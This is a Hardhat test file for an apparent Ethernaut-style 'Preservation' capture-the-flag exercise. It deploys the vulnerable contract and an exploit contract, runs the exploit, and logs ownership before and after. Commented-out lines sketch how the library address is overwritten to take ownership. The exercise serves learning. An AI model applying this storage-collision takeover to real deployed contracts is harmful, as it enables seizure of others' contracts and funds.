import { expect } from 'chai';
import { ethers } from 'hardhat';


describe("Preservation Exploit", function() {

    let contract: any;
    let timeZone1: any;
    let timeZone2: any;
    let exploit: any;
    let owner: any;

    before(async () => {
        const contractFactory = await ethers.getContractFactory("Preservation");
        const timeZoneFactory = await ethers.getContractFactory("LibraryContract");
        
        const exploitFactory = await ethers.getContractFactory("PreservationExploit");

        [owner] = await ethers.getSigners();

        timeZone1 = await timeZoneFactory.deploy();
        timeZone2 = await timeZoneFactory.deploy();
        contract = await contractFactory.deploy(timeZone1.address, timeZone2.address);
        exploit = await exploitFactory.deploy(contract.address);
    });

    xit("main contract should have the timeZone address set correctly", async ()=> {

        let timeZone1Address = await contract.functions.timeZone1Library();
        let timeZone2Address = await contract.functions.timeZone2Library();

        expect(timeZone1Address[0]).to.equal(timeZone1.address);
        expect(timeZone2Address[0]).to.equal(timeZone2.address);
    })

    it("should be able to use library function to change timeZone address and exploit the contract", async () => {
        console.log(await contract.functions.owner());
        await exploit.functions.exploit();
        // let timeZone1InitialValue = await contract.functions.timeZone1Library();
        // await contract.functions.setFirstTime(exploit.address);
        // let timeZone1UpdatedValue = await contract.functions.timeZone1Library();
        // expect(timeZone1InitialValue[0]).not.equal(timeZone1UpdatedValue[0]);
        // expect(timeZone1UpdatedValue[0]).to.equal(exploit.address);
        // await contract.functions.setFirstTime(1);
        console.log(await contract.functions.owner());
    })
})